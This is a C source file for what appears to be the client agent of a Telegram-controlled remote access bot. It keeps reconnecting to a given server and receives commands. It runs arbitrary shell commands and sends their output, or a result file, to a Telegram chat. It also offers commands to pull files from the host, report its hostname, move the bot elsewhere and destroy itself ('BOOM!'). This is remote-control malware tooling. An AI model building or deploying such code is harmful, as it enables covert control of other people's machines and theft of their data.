#include "include/common.h"
#include "Telegram/telegram.h"
#include "Telegram/common.h"
#include "include/util.h"


#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include <sys/stat.h>

#define OP_START '\\x02'
#define OP_STOP "\x03"



void *changecommand(char *id,char *text);


int main(int argc , char *argv[])
{
    int socket_desc, index = 0, index1 = 0, potnumber_client;
    char message[2000], server_reply[2000], word_copy_message[150];
    struct sockaddr_in server;

    potnumber_client = atoi(argv[2]);
    memset(word_copy_message, 0, 150);

    //Create socket
    //If cannot create socket it return value of socket_desc valuable = -1
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);

    if (3 != argc) {
        fprintf(stderr, "Usage: %s <server> <port>\n", argv[0]);
        exit(1);

    }

    if (socket_desc == -1)
    {
        printf("Could not create socket");
    
    }
         
    server.sin_addr.s_addr = inet_addr(argv[1]);
    server.sin_family = AF_INET;
    server.sin_port = htons(potnumber_client);
 
    //Connect to remote server
    //If cannot connect to server it return value of (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0 and end program
    while(1) {
        socket_desc = socket(AF_INET , SOCK_STREAM , 0);
        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_family = AF_INET;
        server.sin_port = htons(potnumber_client);  
        if(connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) >= 0) {
            printf("Connected\n");
            break;
        } else {
            printf("Try to connected\n");
            usleep(3000000);
        }
    }
    char chat_id[60];
    char chat_text[4098];
    
    bzero(chat_id,60);        
    if( read(socket_desc, chat_id , 50 ) < 0)
    {
        printf("recieve failed");
    }
    printf("%s\n",chat_id);
    bzero(chat_text,4000);        
    if( read(socket_desc, chat_text , 4000 ) < 0)
    {
        printf("recieve failed");
    }
    // printf("%s\n",chat_text);
    
    changecommand(chat_id,chat_text);
    printf("%s\n", chat_text);
    //combine all message_box
    FILE *fp, *error_file, *exe_file;
    fp = popen("touch result.txt","r");
    fp = popen("touch error.txt","r");
    telegram_send_act(chat_id, "typing");
    exeCMD(chat_id);
    // usleep(10000);
    sleep(6);
    char buf[2000], msg[2010];
    bzero(buf,1999);
    exe_file = fopen("result.txt","r");

    fseek(exe_file, 0, SEEK_END);
    int result_len = ftell(exe_file);
    rewind(exe_file);

    fclose(exe_file);

    if(result_len == 0)
    {
        error_file = fopen("error.txt","r");        
        if(error_file != NULL)
        {
            while(!feof(error_file)){
                memset(buf, 0, sizeof(buf));
                int bufflen = fread(buf, 1, sizeof(buf), error_file);
                buf[bufflen] = 0;
            }
            
        }
        fclose(error_file);
        
        printf("Null\n");
        sprintf(msg, "```\n%s\n```", buf);
        telegram_send_act(chat_id, "typing");
        telegram_send_msg(chat_id, msg);
        printf("%s\n", buf);
        bzero(buf,1999);
    }
    else if(result_len < 1024)
    {
        exe_file = fopen("result.txt", "r");
        if(exe_file != NULL){
            while(!feof(exe_file)){
                memset(buf, 0, sizeof(buf));
                int bufflen = fread(buf, 1, sizeof(buf), exe_file);
                buf[bufflen] = 0;
            }
            
        }
        fclose(exe_file);

        printf("Yeah!\n");
        // fgets(buf, 1024, fp);
        //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
        sprintf(msg, "```\n%s\n```", buf);
        telegram_send_act(chat_id, "typing");
        telegram_send_msg(chat_id, msg);
        printf("%s\n", buf);
        bzero(buf,1999);

    }
    else{
        //sending_exe.log
        telegram_send_act(chat_id, "upload_document");
        telegram_send_file(chat_id, "result.txt");
        printf("send result.txt\n");
    }
    printf("wow");
    
    fp = popen("rm result.txt","r");
    fp = popen("rm error.txt","r");
}
void *changecommand(char *id,char *text) {
    char text_build[4000], command_detail[500],temp_text[2000];
    char path[4000], pName[4000];
    int start_index, index = 0, length;

    getNowPath(path);
    getpName(pName);

    strcpy(text_build, text);
    length = strlen(text);
    memset(text, 0, 4000);
    memset(command_detail, 0, 500);

    if(text_build[0] == '/') {
        start_index = 1;
    } else {
        start_index = 0;
    }
    
    for(start_index; start_index < length; start_index++) {
        text[index] = text_build[start_index];
        index += 1;
        if(strcmp(text, "shell ") == 0) {
            memset(text, 0, 4000);
            index = 0;
            // strcpy(command_detail, "Exec shell commands with timeout.");
        }else if(strcmp(text, "mvbot ") == 0) {
            memset(text, 0, 4000);
            index = 0;
            strcpy(command_detail, "Move bot to custom location.");
        }else if(strcmp(text, "timeout ") == 0) {
            memset(text, 0, 4000);
            index = 0;
            strcpy(command_detail, "Set timeout for shell.");
        } else if(strcmp(text, "help") == 0) {
            strcpy(command_detail, "List of commands.");
        }
        else if(strcmp(text, "cp") == 0) {
            strcpy(command_detail, "Copy file/folder.");
        }
        else if(strcmp(text, "mv") == 0) {
            strcpy(command_detail, "Move file/folder.");
        }
        else if(strcmp(text, "rm") == 0) {
            strcpy(command_detail, "Remove file/folder.");
        }
        else if(strcmp(text, "mkdir") == 0) {
            strcpy(command_detail, "Make directory.");
        }
        else if(strcmp(text, "getfile ") == 0) {
            strcpy(command_detail, "Download file from bot.");
            telegram_send_file(id,text);
        }
        else if(strcmp(text, "BOOM!") == 0) {
            strcpy(command_detail, "DESTROY ITSELF!");
            boom(path,pName);
        }
        else if(strcmp(text, "gethostname") == 0) {
            strcpy(command_detail, "Get hostname of client.");
            getHostname(temp_text);
            telegram_send_msg(id,temp_text);
        }
        printf("%s", command_detail);
        memset(command_detail, 0, 500);
    }
    index = 0;
}

